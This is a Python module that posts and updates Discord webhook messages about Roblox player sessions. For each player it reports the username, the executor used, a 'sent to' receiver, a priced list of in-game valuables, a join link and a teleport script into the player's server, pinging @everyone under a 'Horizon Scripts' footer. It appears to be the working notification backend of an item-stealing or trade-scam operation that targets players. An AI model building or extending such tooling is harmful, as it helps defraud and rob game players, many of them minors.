from __future__ import annotations
import re
import time
from datetime import datetime
from typing import Optional
import requests
from .logger import get_logger
from .sessions import Session

logger = get_logger("discord")

COLOR_STARTING = 0xFEE75C
COLOR_INGAME   = 0x57F287
COLOR_LEFT     = 0xED4245

_valuables_cache: dict[str, dict] = {}
_valuables_fetched_at: float = 0
_VALUABLES_TTL = 300

def _get_valuables() -> dict[str, dict]:
    global _valuables_cache, _valuables_fetched_at
    now = time.time()
    if _valuables_cache and now - _valuables_fetched_at < _VALUABLES_TTL:
        return _valuables_cache
    try:
        resp = requests.get(
            "https://api.project-reverse.org/valuables/get-game-valuables?game=gag2",
            timeout=5,
        )
        if resp.status_code == 200:
            data = resp.json().get("data", [])
            _valuables_cache = {
                item["name"]: {"emoji": item.get("emoji", ""), "price": item.get("price", 0)}
                for item in data
            }
            _valuables_fetched_at = now
            logger.info("Valuables cache refreshed (%d items)", len(_valuables_cache))
    except Exception as exc:
        logger.warning("Failed to fetch valuables: %s", exc)
    return _valuables_cache


def _build_items_field(items: dict[str, int], valuables: dict[str, dict]) -> str:
    """
    items: {"Sakura": 4, "Raccoon": 2, ...}
    Only include items that exist in the valuables API.
    Format: emoji name [owned] ($price)
    """
    lines = []
    for name, owned in items.items():
        info = valuables.get(name)
        if info is None:
            continue
        emoji = info["emoji"]
        price = info["price"]
        price_str = f"${price:,.2f}" if price else "$0.00"
        lines.append(f"{emoji} {name} [x{owned}] ({price_str})")
    return "```\n" + "\n".join(lines) + "\n```" if lines else "```\nNo valuables found\n```"


def _parse_webhook_url(url: str) -> tuple[str, str]:
    match = re.search(r"/webhooks/(\d+)/([\w-]+)", url)
    if not match:
        raise ValueError("Invalid Discord webhook URL")
    return match.group(1), match.group(2)


def _build_embed(session: Session, color: int) -> dict:
    status_label = {
        "starting": "🔵 starting",
        "ingame":   "🟡 in-game",
        "left":     "🔴 left",
    }.get(session.current_status, "⚪ unknown")

    join_url = (
        f"https://plsbrainrot.me/joiner"
        f"?placeId={session.placeid}&gameInstanceId={session.jobid}"
    )

    valuables = _get_valuables()
    items_value = _build_items_field(session.items, valuables)

    return {
        "title": f"{session.username} | {session.jobid}",
        "color": color,
        "fields": [
            {
                "name": "# **user information**",
                "value": (
                    f"```\n"
                    f"👤 username: {session.username}\n"
                    f"🖥️ display:  {session.display}\n"
                    f"🎮 executor: {session.executor}\n"
                    f"📬 sent to:  {session.receiver}\n"
                    f"```"
                ),
            },
            {
                "name": "# **join link**",
                "value": f"[Click Me To Join]({join_url})",
            },
            {
                "name": "# **status**",
                "value": (
                    f"```\n"
                    f"⏲️ up time: {session.uptime}\n"
                    f"⚡ status:  {status_label}\n"
                    f"```"
                ),
            },
            {
                "name": "# user's valuables",
                "value": items_value,
            },
            {
                "name": "# **join script**",
                "value": (
                    f"```\n"
                    f'game:GetService("TeleportService"):'
                    f'TeleportToPlaceInstance({session.placeid}, "{session.jobid}")\n'
                    f"```"
                ),
            },
        ],
        "footer": {"text": "Horizon Scripts | discord.gg/uFtDw6NVVr | Best Script Services"},
        "timestamp": datetime.utcnow().isoformat() + "Z",
    }


def _send_request(method: str, url: str, payload: dict) -> Optional[requests.Response]:
    try:
        return requests.request(
            method, url, json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
    except requests.RequestException as exc:
        logger.error("Discord %s failed: %s", method, exc)
        return None


def post_message(session: Session, webhook_url: str) -> Optional[str]:
    embed = _build_embed(session, COLOR_STARTING)
    payload = {"content": "@everyone", "embeds": [embed]}
    resp = _send_request("POST", webhook_url + "?wait=true", payload)
    if resp is None:
        return None
    if resp.status_code == 200:
        try:
            msg_id = resp.json().get("id")
            logger.info("Discord POST ok | jobid=%s msg_id=%s", session.jobid, msg_id)
            return msg_id
        except Exception:
            logger.warning("Discord POST ok but no JSON body")
            return None
    logger.error("Discord POST failed: %d — %s", resp.status_code, resp.text[:200])
    return None


def patch_message(session: Session, color: int, webhook_url: str) -> bool:
    if not session.discord_message_id:
        logger.warning("No message_id for jobid=%s — falling back to POST", session.jobid)
        new_id = post_message(session, webhook_url)
        if new_id:
            from .sessions import SessionStore
            SessionStore().set_message_id(session.jobid, new_id)
        return new_id is not None

    wh_id, wh_token = _parse_webhook_url(webhook_url)
    patch_url = (
        f"https://discord.com/api/webhooks/{wh_id}/"
        f"{wh_token}/messages/{session.discord_message_id}"
    )
    embed = _build_embed(session, color)
    resp = _send_request("PATCH", patch_url, {"embeds": [embed]})
    if resp is None:
        return False
    if resp.status_code == 200:
        logger.info("Discord PATCH ok | jobid=%s status=%s", session.jobid, session.current_status)
        return True
    if resp.status_code == 404:
        logger.warning("Message deleted | jobid=%s — re-POSTing", session.jobid)
        new_id = post_message(session, webhook_url)
        if new_id:
            from .sessions import SessionStore
            SessionStore().set_message_id(session.jobid, new_id)
        return new_id is not None
    logger.error("Discord PATCH failed: %d — %s", resp.status_code, resp.text[:200])
    return False
